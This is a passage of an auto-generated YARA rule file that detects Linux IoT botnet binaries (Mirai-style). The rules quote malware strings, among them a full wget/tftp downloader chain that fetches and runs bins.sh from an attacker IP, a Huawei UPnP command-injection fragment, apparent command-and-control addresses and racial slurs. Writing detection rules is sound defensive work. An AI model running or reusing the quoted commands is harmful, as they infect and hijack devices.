      $s4 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s5 = "hexPayload" fullword ascii
      $s6 = "lock_commands" fullword ascii
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s8 = "httpd_port" fullword ascii
      $s9 = "bin/systemd" fullword ascii
      $s10 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s11 = "huawei_fake_time" fullword ascii
      $s12 = "whitelistpaths" fullword ascii
      $s13 = "lockdown" fullword ascii
      $s14 = "killall" fullword ascii
      $s15 = "httpd_serve" fullword ascii
      $s16 = "httpd.c" fullword ascii
      $s17 = "httpd_start" fullword ascii
      $s18 = "httpd_started" fullword ascii
      $s19 = "httpd_pid" fullword ascii
      $s20 = "huawei_setup_connection" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0d }
      $op1 = { f4 ff ff ff f4 ff ff ff b0 29 00 00 f4 ff ff ff }
      $op2 = { 51 e3 01 c0 20 e0 42 00 00 0a 00 10 61 42 01 20 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_19 {
   meta:
      description = "Linux_19"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "56fd82656a27d803f0976d6c762b2273d0d4b803330204260c7d66c62fd43ef0"
   strings:
      $s1 = "attack_tcp_bypass" fullword ascii
      $s2 = "hide_process" fullword ascii
      $s3 = "attack_udp_bypass" fullword ascii
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s5 = "__scan_getc" fullword ascii
      $s6 = "__scan_ungetc" fullword ascii
      $s7 = "scan_getwc" fullword ascii
      $s8 = "kill_head" fullword ascii
      $s9 = "util_encryption" fullword ascii
      $s10 = "getpeername.c" fullword ascii
      $s11 = "attack_get_opt_str" fullword ascii
      $s12 = "wlancont" fullword ascii
      $s13 = "__scan_cookie.c" fullword ascii
      $s14 = "localhost.c" fullword ascii
      $s15 = "__init_scan_cookie" fullword ascii
      $s16 = "table_keys" fullword ascii
      $s17 = "ferror.c" fullword ascii
      $s18 = "killer_maps_cmd_idkanymore.c" fullword ascii
      $s19 = "perror.c" fullword ascii
      $s20 = "__GI_ungetc" fullword ascii

      $op0 = { 11 00 20 01 44 13 01 00 bc 34 00 00 50 }
      $op1 = { f4 ff ff ff f4 ff ff ff dc 2a 00 00 f4 ff ff ff }
      $op2 = { ea 00 00 a0 e3 70 40 bd e8 1e ff 2f e1 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_20 {
   meta:
      description = "Linux_20"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "972e99ec1f16b326c2b8d02e6a7b9b0e3924104c10797473032f8590f900181b"
   strings:
      $s1 = "attack_tcp_bypass" fullword ascii
      $s2 = "hide_process" fullword ascii
      $s3 = "attack_udp_bypass" fullword ascii
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s5 = "__scan_getc" fullword ascii
      $s6 = "__scan_ungetc" fullword ascii
      $s7 = "scan_getwc" fullword ascii
      $s8 = "kill_head" fullword ascii
      $s9 = "util_encryption" fullword ascii
      $s10 = "getpeername.c" fullword ascii
      $s11 = "attack_get_opt_str" fullword ascii
      $s12 = "wlancont" fullword ascii
      $s13 = "__scan_cookie.c" fullword ascii
      $s14 = "localhost.c" fullword ascii
      $s15 = "__init_scan_cookie" fullword ascii
      $s16 = "table_keys" fullword ascii
      $s17 = "ferror.c" fullword ascii
      $s18 = "killer_maps_cmd_idkanymore.c" fullword ascii
      $s19 = "perror.c" fullword ascii
      $s20 = "__GI_ungetc" fullword ascii

      $op0 = { 11 00 20 01 44 13 01 00 c4 34 00 00 50 }
      $op1 = { f4 ff ff ff f4 ff ff ff e4 2a 00 00 f4 ff ff ff }
      $op2 = { ea 00 00 a0 e3 70 40 bd e8 1e ff 2f e1 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_21 {
   meta:
      description = "Linux_21"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b6d5f5068ae3d5593671cb17752877694a097951ab4aefcb75dccab72620f590"
   strings:
      $s1 = "update_process" fullword ascii
      $s2 = "hexPayload" fullword ascii
      $s3 = "util_fdgets" fullword ascii
      $s4 = "killer_kill_by_port" fullword ascii
      $s5 = "local_bind.4620" fullword ascii
      $s6 = "attack_tcp.c" fullword ascii
      $s7 = "__libc_accept" fullword ascii
      $s8 = "attack_tcp_syn" fullword ascii
      $s9 = "attack_tcp_sack2" fullword ascii
      $s10 = "attack_tcp_legit" fullword ascii
      $s11 = "__sys_recvfrom" fullword ascii
      $s12 = "attack_ongoing" fullword ascii
      $s13 = "attack_tcp_ack" fullword ascii
      $s14 = "attack_tcp_stomp" fullword ascii
      $s15 = "util_itoa" fullword ascii
      $s16 = "attack_udp.c" fullword ascii
      $s17 = "attack_kill_all" fullword ascii
      $s18 = "anti_gdb_entry" fullword ascii
      $s19 = "attack_udp_plain" fullword ascii
      $s20 = "util_stristr" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0d }
      $op1 = { f4 ff ff ff f4 ff ff ff 68 08 00 00 f4 ff ff ff }
      $op2 = { 51 e3 01 c0 20 e0 42 00 00 0a 00 10 61 42 01 20 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_22 {
   meta:
      description = "Linux_22"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "69e14ec4c006c5c06fe3cfb4d0e0e3bef3aa991a2373e327d9a4d8d0ee5aad27"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s2 = "httpd_port" fullword ascii
      $s3 = "util_fdgets" fullword ascii
      $s4 = "resolv_lookup" fullword ascii
      $s5 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s6 = "killer_kill_by_port" fullword ascii
      $s7 = "local_bind.4755" fullword ascii
      $s8 = "__libc_accept" fullword ascii
      $s9 = "attack_tcp_syn" fullword ascii
      $s10 = "resolv_entries_free" fullword ascii
      $s11 = "__sys_recvfrom" fullword ascii
      $s12 = "attack_tcp_ack" fullword ascii
      $s13 = "util_itoa" fullword ascii
      $s14 = "attack_udp_vse" fullword ascii
      $s15 = "anti_gdb_entry" fullword ascii
      $s16 = "attack_udp_plain" fullword ascii
      $s17 = "util_stristr" fullword ascii
      $s18 = "ioctl_pid" fullword ascii
      $s19 = "rand_alpha_str" fullword ascii
      $s20 = "ensure_single_instance" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0d }
      $op1 = { 11 00 20 01 94 e5 00 00 38 34 00 00 4c }
      $op2 = { f4 ff ff ff f4 ff ff ff 68 28 00 00 f4 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_23 {
   meta:
      description = "Linux_23"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1591920bdc5da520833c47cf59c5de63b51a9d191d4cfddcf14749428bc3a458"
   strings:
      $s1 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s5 = "attack_get_opt_str" fullword ascii
      $s6 = "util_fdgets" fullword ascii
      $s7 = "attack_rawflood" fullword ascii
      $s8 = "attack_method_hexflood" fullword ascii
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s10 = "exploit.c" fullword ascii
      $s11 = "zkjtjaz" fullword ascii
      $s12 = "killer_kill_by_port" fullword ascii
      $s13 = "attack_app_http" fullword ascii
      $s14 = "?/sys/devices/system/cpu" fullword ascii
      $s15 = "completed.4753" fullword ascii
      $s16 = "214.194.12.158" fullword ascii
      $s17 = "ncpus probed" fullword ascii
      $s18 = "attack_method_nfodrop" fullword ascii
      $s19 = "local_bind.4561" fullword ascii
      $s20 = "ncpus active" fullword ascii

      $op0 = { 82 10 60 78 c2 05 c0 01 82 00 60 34 c4 00 60 08 }
      $op1 = { a4 10 60 34 90 10 00 10 92 10 00 11 94 10 00 14 }
      $op2 = { 80 a2 3f ff 02 80 00 04 80 a2 20 00 04 80 00 04 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_24 {
   meta:
      description = "Linux_24"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "422e61a16eab7b3cbacbabfa00d7968b91daaa9a9595ab4160104a39ab1d704c"
   strings:
      $s1 = "attack_method_udpbypass" fullword ascii
      $s2 = "attack_get_opt_str" fullword ascii
      $s3 = "util_fdgets" fullword ascii
      $s4 = "attack_ovh_flood" fullword ascii
      $s5 = "killerkillbyname" fullword ascii
      $s6 = "killerinit" fullword ascii
      $s7 = "killerpid" fullword ascii
      $s8 = "killer_kill_by_port" fullword ascii
      $s9 = "local_bind.4769" fullword ascii
      $s10 = "__libc_accept" fullword ascii
      $s11 = "attack_udp_smart" fullword ascii
      $s12 = "util_itoa" fullword ascii
      $s13 = "anti_gdb_entry" fullword ascii
      $s14 = "util_stristr" fullword ascii
      $s15 = "ioctl_pid" fullword ascii
      $s16 = "rand_alpha_str" fullword ascii
      $s17 = "attack_method.c" fullword ascii
      $s18 = "ensure_single_instance" fullword ascii
      $s19 = "ioctl_keepalive" fullword ascii
      $s20 = "attack_method_nudp" fullword ascii

      $op0 = { f4 ff ff ff f4 ff ff ff a4 0d 00 00 f4 ff ff ff }
      $op1 = { 51 e3 01 c0 20 e0 42 00 00 0a 00 10 61 42 01 20 }
      $op2 = { 51 e3 f0 45 2d e9 00 50 a0 e1 27 00 00 da b4 a0 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_25 {
   meta:
      description = "Linux_25"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "688809ac2f0f2beb45d7ea2beb37fac5e7d164dc9930b32eea3e639103e91e31"
   strings:
      $s1 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s5 = "attack_get_opt_str" fullword ascii
      $s6 = "util_fdgets" fullword ascii
      $s7 = "attack_rawflood" fullword ascii
      $s8 = "attack_method_hexflood" fullword ascii
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s10 = "exploit.c" fullword ascii
      $s11 = "zkjtjaz" fullword ascii
      $s12 = "killer_kill_by_port" fullword ascii
      $s13 = "attack_app_http" fullword ascii
      $s14 = "214.194.12.158" fullword ascii
      $s15 = "attack_method_nfodrop" fullword ascii
      $s16 = "local_bind.4748" fullword ascii
      $s17 = "scanner.c" fullword ascii
      $s18 = "zltkaz" fullword ascii
      $s19 = "__libc_accept" fullword ascii
      $s20 = "attack_ongoing" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0d }
      $op1 = { f4 ff ff ff f4 ff ff ff 68 08 00 00 f4 ff ff ff }
      $op2 = { ea 00 00 e0 e3 70 40 bd e8 1e ff 2f e1 00 30 d0 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_26 {
   meta:
      description = "Linux_26"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "af5e4587b849eecd603ebfade9ef24e821ff185011f61434bb7c6d722e89cb88"
   strings:
      $s1 = "__stdio_mutex_initializer.3860" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s4 = "/home/firmware/build/temp-sparc/gcc-core/gcc" fullword ascii
      $s5 = "/home/firmware/build/temp-sparc/build-gcc/gcc" fullword ascii
      $s6 = "/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii
      $s7 = "completed.2248" fullword ascii
      $s8 = "94.156.64.143:9821" fullword ascii
      $s9 = "KM^_`abcdefghijk" fullword ascii
      $s10 = "[0;97m| Device: " fullword ascii
      $s11 = "[0;97m  | Endian " fullword ascii
      $s12 = "gayass.c" fullword ascii
      $s13 = "ay2fzc1txz22mldwtj4ipcevw5q8zq6" fullword ascii
      $s14 = "[0;91mNigger " fullword ascii
      $s15 = "libc/string/sparc/memcpy.S" fullword ascii
      $s16 = "libc/sysdeps/linux/sparc/crtn.S" fullword ascii
      $s17 = "libc/string/sparc/strlen.S" fullword ascii
      $s18 = "libc/sysdeps/linux/sparc/rem.S" fullword ascii
      $s19 = "libc/sysdeps/linux/sparc/crt1.S" fullword ascii
      $s20 = "libc/string/sparc/memset.S" fullword ascii

      $op0 = { 82 10 00 08 c2 34 00 00 c2 07 a0 44 82 00 60 02 }
      $op1 = { 82 10 3f fe c2 2f bf f7 10 80 00 34 01 }
      $op2 = { 07 3f ff fb 86 10 e3 34 86 00 c0 1e c8 00 c0 00 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_27 {
   meta:
      description = "Linux_27"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "df63b0c49c038a77666cfd63bd9af48ae45f004c08e377872bfa208c8a8f6120"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s3 = "tpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm " ascii
      $s4 = "92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; f" ascii
      $s5 = "REPORT %s:%s:%s" fullword ascii
      $s6 = "__stdio_mutex_initializer.3860" fullword ascii
      $s7 = "infectline" fullword ascii
      $s8 = "getRandomPublicIP" fullword ascii
      $s9 = "/home/firmware/build/temp-sparc/gcc-core/gcc" fullword ascii
      $s10 = "/home/firmware/build/temp-sparc/build-gcc/gcc" fullword ascii
      $s11 = "/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii
      $s12 = "GETLOCALIP" fullword ascii
      $s13 = "PROBING" fullword ascii
      $s14 = "getBogos" fullword ascii
      $s15 = "getCores" fullword ascii
      $s16 = "/usr/sbin/dropbear" fullword ascii
      $s17 = "zprintf" fullword ascii
      $s18 = "hextable" fullword ascii
      $s19 = "fdpclose" fullword ascii
      $s20 = "fdpopen" fullword ascii

      $op0 = { 82 10 3f fe c2 2f bf f7 10 80 00 34 01 }
      $op1 = { c2 07 bf f0 83 28 60 02 90 10 00 01 40 00 34 e5 }
      $op2 = { 82 10 20 05 c2 27 bf 34 c0 27 bf 38 c0 27 bf e4 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_28 {
   meta:
      description = "Linux_28"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5f86ab87e8f3336371bf80a7a47bf8abfd5f2e0434023832b56a1ca96d1ca1ad"
   strings:
      $s1 = "__stdio_mutex_initializer.3860" fullword ascii
      $s2 = "(TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms" fullword ascii
      $s3 = "/home/firmware/build/temp-sparc/gcc-core/gcc" fullword ascii
      $s4 = "/home/firmware/build/temp-sparc/build-gcc/gcc" fullword ascii
      $s5 = "/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii
      $s6 = "completed.2248" fullword ascii
      $s7 = "KM^_`abcdefghijk" fullword ascii
      $s8 = "libc/string/sparc/memcpy.S" fullword ascii
      $s9 = "libc/sysdeps/linux/sparc/crtn.S" fullword ascii
      $s10 = "libc/string/sparc/strlen.S" fullword ascii
      $s11 = "libc/sysdeps/linux/sparc/rem.S" fullword ascii
      $s12 = "libc/sysdeps/linux/sparc/crt1.S" fullword ascii
      $s13 = "libc/string/sparc/memset.S" fullword ascii
      $s14 = "object.2329" fullword ascii
      $s15 = "been_there_done_that.2818" fullword ascii
      $s16 = "libc/sysdeps/linux/sparc/urem.S" fullword ascii
      $s17 = "libc/sysdeps/linux/sparc/crti.S" fullword ascii
      $s18 = "libc/sysdeps/linux/sparc/fork.S" fullword ascii
      $s19 = "libc/string/sparc/strcpy.S" fullword ascii
      $s20 = "qual_chars.4078" fullword ascii

      $op0 = { dc 07 bf 34 81 e8 00 00 81 c3 e0 08 01 }
      $op1 = { d0 07 bf ec 40 00 34 dd 01 }
      $op2 = { d0 07 bf e4 40 00 34 a5 01 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_29 {
   meta:
      description = "Linux_29"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bf5e6947f6829d17b8a8e5984366efcf5592d8f6bc7ec6d7e85b1872bebcb24a"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-sparc/gcc-core/gcc" fullword ascii
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii
      $s3 = "hoste.6718" fullword ascii
      $s4 = "completed.4753" fullword ascii
      $s5 = "ncpus probed" fullword ascii
      $s6 = "ncpus active" fullword ascii
      $s7 = "</etc/hosts" fullword ascii
      $s8 = "KM^_`abcdefghijk" fullword ascii
      $s9 = "__GI___waitpid" fullword ascii
      $s10 = "__GI___libc_waitpid" fullword ascii
      $s11 = "__waitpid" fullword ascii
      $s12 = "__sparc32_atomic_locks" fullword ascii
      $s13 = "__rt_sigreturn_stub" fullword ascii
      $s14 = "rt_sigaction" fullword ascii
      $s15 = "__sigreturn_stub" fullword ascii
      $s16 = "object.4768" fullword ascii
      $s17 = "next_start.1332" fullword ascii
      $s18 = "spec_base.6475" fullword ascii
      $s19 = "unknown.1356" fullword ascii
      $s20 = "spec_chars.6481" fullword ascii

      $op0 = { d0 27 bf 34 10 80 00 04 01 }
      $op1 = { d0 07 bf ec 40 00 34 26 01 }
      $op2 = { 82 10 23 e8 c2 27 bf 34 c4 07 bf 34 c4 27 bf 74 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_30 {
   meta:
      description = "Linux_30"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c7170b43119c5f979dcc529944b345fd4f7b7358c526a8e1dc95b9125f98048d"
   strings:
      $s1 = "__stdio_mutex_initializer.3860" fullword ascii
      $s2 = "/home/firmware/build/temp-sparc/gcc-core/gcc" fullword ascii
      $s3 = "/home/firmware/build/temp-sparc/build-gcc/gcc" fullword ascii
      $s4 = "/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii
      $s5 = "completed.2248" fullword ascii
      $s6 = "KM^_`abcdefghijk" fullword ascii
      $s7 = "libc/string/sparc/memcpy.S" fullword ascii
      $s8 = "libc/sysdeps/linux/sparc/crtn.S" fullword ascii
      $s9 = "libc/string/sparc/strlen.S" fullword ascii
      $s10 = "libc/sysdeps/linux/sparc/rem.S" fullword ascii
      $s11 = "libc/sysdeps/linux/sparc/crt1.S" fullword ascii
      $s12 = "libc/string/sparc/memset.S" fullword ascii
      $s13 = "object.2329" fullword ascii
      $s14 = "been_there_done_that.2818" fullword ascii
      $s15 = "libc/sysdeps/linux/sparc/urem.S" fullword ascii
      $s16 = "libc/sysdeps/linux/sparc/crti.S" fullword ascii
      $s17 = "libc/sysdeps/linux/sparc/fork.S" fullword ascii
      $s18 = "libc/string/sparc/strcpy.S" fullword ascii
      $s19 = "qual_chars.4078" fullword ascii
      $s20 = "prefix.4072" fullword ascii

      $op0 = { 82 10 00 08 c2 34 00 00 c2 07 a0 44 82 00 60 02 }
      $op1 = { 82 10 3f fe c2 2f bf f7 10 80 00 34 01 }
      $op2 = { 07 3f ff fb 86 10 e3 34 86 00 c0 1e c8 00 c0 00 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_31 {
   meta:
      description = "Linux_31"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "971712c2402e2a55bd498329d6ae7d98cbd5d992e570d979616bc57218f50d3c"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s2 = "attack_get_opt_str" fullword ascii
      $s3 = "util_fdgets" fullword ascii
      $s4 = "attack_app_https" fullword ascii
      $s5 = "killer_kill_by_port" fullword ascii
      $s6 = "attack_app_http" fullword ascii
      $s7 = "local_bind.4884" fullword ascii
      $s8 = "scanner.c" fullword ascii
      $s9 = "attack_tcp_syn" fullword ascii
      $s10 = "__sys_recvfrom" fullword ascii
      $s11 = "attack_gre_ip" fullword ascii
      $s12 = "attack_tcp_ack" fullword ascii
      $s13 = "attack_tcp_stomp" fullword ascii
      $s14 = "util_itoa" fullword ascii
      $s15 = "attack_udp_vse" fullword ascii
      $s16 = "anti_gdb_entry" fullword ascii
      $s17 = "attack_udp_generic" fullword ascii
      $s18 = "attack_udp_plain" fullword ascii
      $s19 = "util_stristr" fullword ascii
      $s20 = "ioctl_pid" fullword ascii

      $op0 = { f4 ff ff ff f4 ff ff ff 08 28 00 00 f4 ff ff ff }
      $op1 = { 52 e3 00 30 a0 e1 02 2b 00 e2 0a 00 00 ba 00 00 }
      $op2 = { ef 06 00 a0 e1 f0 47 bd e8 1e ff 2f e1 f0 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_32 {
   meta:
      description = "Linux_32"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9108d21d77fdf8a9a37675d69aca6cedcbc63c296318071a666687ffab5f40a0"
   strings:
      $s1 = "libpthread.so.0" fullword ascii
      $s2 = "/lib/ld-uClibc.so.0" fullword ascii
      $s3 = "libc.so.0" fullword ascii
      $s4 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv" fullword ascii

      $op0 = { 18 0f 01 00 04 e0 2d e5 04 f0 9d e4 3c 30 9f e5 }
      $op1 = { 18 0f 01 00 b0 92 01 00 10 90 01 }
      $op2 = { 02 01 00 40 02 01 00 48 02 01 00 7c 02 01 00 b4 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_33 {
   meta:
      description = "Linux_33"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "968324b33948ddc6e121a32104429beec9c51b2a48243c04adef64bd810d2e49"
   strings:
      $s1 = "udpplain_flood" fullword ascii
      $s2 = "get_random_ip" fullword ascii
      $s3 = "read_elf" fullword ascii
      $s4 = "report_working" fullword ascii
      $s5 = "consume_pass_prompt" fullword ascii
      $s6 = "random_auth_entry" fullword ascii
      $s7 = "consume_user_prompt" fullword ascii
      $s8 = "tcp_flood" fullword ascii
      $s9 = "84.54.51.37" fullword ascii
      $s10 = "udp_flood" fullword ascii
      $s11 = "addpid" fullword ascii
      $s12 = "scanner_kill" fullword ascii
      $s13 = "__sys_recvfrom" fullword ascii
      $s14 = "machine_to_str" fullword ascii
      $s15 = "ascii_X86" fullword ascii
      $s16 = "add_strings" fullword ascii
      $s17 = "] Arch: [" fullword ascii
      $s18 = "ascii_killme" fullword ascii
      $s19 = "recv_strip_null" fullword ascii
      $s20 = "ascii_Corona" fullword ascii

      $op0 = { ea 00 00 a0 e3 70 40 bd e8 1e ff 2f e1 20 34 a0 }
      $op1 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0d }
      $op2 = { f4 ff ff ff f4 ff ff ff c8 09 00 00 f4 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_34 {
   meta:
      description = "Linux_34"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1dbb4b7bb6a8001748b11a72ba215490fd34993ee408eb04197bf08b0dbc57ce"
   strings:
      $s1 = "attack_get_opt_str" fullword ascii
      $s2 = "util_fdgets" fullword ascii
      $s3 = "euqevmk" fullword ascii
      $s4 = "pahagki" fullword ascii
      $s5 = "jbhagpmkj" fullword ascii
      $s6 = "tvmrepa" fullword ascii
      $s7 = "imgvkfqwmjaww" fullword ascii
      $s8 = "pwckmjckj" fullword ascii
      $s9 = "gkigkigki" fullword ascii
      $s10 = "vaehpao" fullword ascii
      $s11 = "jaskvejc" fullword ascii
      $s12 = "atmgvkqpav" fullword ascii
      $s13 = "jaswlaaj" fullword ascii
      $s14 = "lmormwmkj" fullword ascii
      $s15 = "wqttkvp" fullword ascii
      $s16 = "cvkqpav" fullword ascii
      $s17 = "emvhmra" fullword ascii
      $s18 = "wavrmga" fullword ascii
      $s19 = "nqejpagl" fullword ascii
      $s20 = "lwhsmbmgei" fullword ascii

      $op0 = { f4 ff ff ff f4 ff ff ff 7c 08 00 00 f4 ff ff ff }
      $op1 = { 51 e3 01 c0 20 e0 42 00 00 0a 00 10 61 42 01 20 }
      $op2 = { 51 e3 f0 45 2d e9 00 50 a0 e1 27 00 00 da b4 a0 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_35 {
   meta:
      description = "Linux_35"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "6996224136d32045b5a44ae686d1d90c089f6c11f89306f1121112f285b88405"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s2 = "hoste.6548" fullword ascii
      $s3 = "uunknown error" fullword ascii
      $s4 = "resolv_conf_mtime.6591" fullword ascii
      $s5 = "last_ns_num.6605" fullword ascii
      $s6 = "xdigits.4932" fullword ascii
      $s7 = "last_id.6606" fullword ascii
      $s8 = "ipState.5818" fullword ascii
      $s9 = "do_system" fullword ascii
      $s10 = "sa_refcntr" fullword ascii
      $s11 = "buf.4507" fullword ascii
      $s12 = "buf.6549" fullword ascii
      $s13 = "i.4880" fullword ascii

      $op0 = { 0a f5 00 00 ea 34 40 1b e5 02 00 a0 e3 01 10 a0 }
      $op1 = { f4 ff ff ff f4 ff ff ff fc 4b 00 00 f4 ff ff ff }
